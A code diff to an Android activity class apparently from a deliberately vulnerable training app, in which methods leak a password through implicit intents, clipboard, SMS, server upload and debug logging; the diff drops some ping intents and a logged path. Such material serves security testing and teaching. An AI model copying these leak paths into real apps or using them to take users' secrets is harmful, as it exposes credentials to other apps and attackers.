@@ -36,12 +36,11 @@ public class ExfiltrationActivity extends Activity {
         sendViaImplicitActivityIntent(secret);
         sendViaImplicitBroadcastIntent(secret);
         sendViaImplicitServiceIntent(secret);
-        sendEmptyImplicitIntents();
         sendFileViaImplicitIntent(path);
         copyToClipboard(secret, path);
         sendViaSms(phone, secret, path);
         uploadToServer(server, secret, path);
-        logSensitiveData(secret, path);
+        logSensitiveData(secret);
         setAttackerResult(resultIntent);
         finish();
     }
@@ -62,12 +61,6 @@ public class ExfiltrationActivity extends Activity {
         Intent intent = new Intent("oversecured.ovaa.action.SYNC");
         intent.putExtra("password", secret);
         startService(intent);
-    }
-
-    private void sendEmptyImplicitIntents() {
-        startActivity(new Intent("oversecured.ovaa.action.PING_ACTIVITY"));
-        sendBroadcast(new Intent("oversecured.ovaa.action.PING_BROADCAST"));
-        startService(new Intent("oversecured.ovaa.action.PING_SERVICE"));
     }
 
     private void sendFileViaImplicitIntent(String path) {
@@ -124,9 +117,8 @@ public class ExfiltrationActivity extends Activity {
         }
     }
 
-    private void logSensitiveData(String secret, String path) {
+    private void logSensitiveData(String secret) {
         Log.d(TAG, "current password: " + secret);
-        Log.v(TAG, "request path: " + path);
     }
 
     private void setAttackerResult(Intent result) {
